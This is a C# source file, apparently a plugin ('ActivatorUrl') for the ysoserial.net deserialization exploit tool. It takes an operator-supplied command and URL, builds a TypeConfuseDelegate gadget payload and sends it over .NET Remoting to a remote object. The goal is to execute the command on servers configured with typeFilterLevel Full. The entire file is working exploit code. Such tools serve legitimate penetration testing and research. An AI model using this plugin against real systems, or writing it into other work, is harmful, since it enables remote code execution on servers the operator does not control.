using System;
using System.Collections.Generic;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using NDesk.Options;
using ysoserial.Generators;

namespace ysoserial.Plugins
{
    // Author: Harrison Neal
    // Inspired by targets with BinaryServerFormatterSink.typeFilterLevel = Full
    public class ActivatorUrlPlugin : IPlugin
    {
        private static string command = "";
        private static string url = "";
        private static bool secure;

        private static readonly OptionSet options = new OptionSet
        {
            {"c|command=", "the command to be executed.", v => command = v},
            {"u|url=", "the url passed to Activator.GetObject.", v => url = v},
            {
                "s", "if TCPChannel security should be enabled.", v =>
                {
                    if (v != null) secure = true;
                }
            }
        };

        public string Name()
        {
            return "ActivatorUrl";
        }

        public string Description()
        {
            return "Sends a generated payload to an activated, presumably remote, object";
        }

        public string Credit()
        {
            return "Harrison Neal";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            List<string> extra;
            try
            {
                extra = options.Parse(args);

                if (string.IsNullOrWhiteSpace(url)) throw new ArgumentException("A URL must be provided.");

                if (string.IsNullOrWhiteSpace(command)) throw new ArgumentException("A command must be provided.");
            }
            catch (Exception e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                Environment.Exit(-1);
            }

            try
            {
                if (secure) ChannelServices.RegisterChannel(new TcpChannel(), true);

                Activator.GetObject(typeof(MarshalByRefObject), url)
                    .Equals(TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(command));
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                Console.WriteLine();
            }

            return "Payload already sent";
        }
    }
}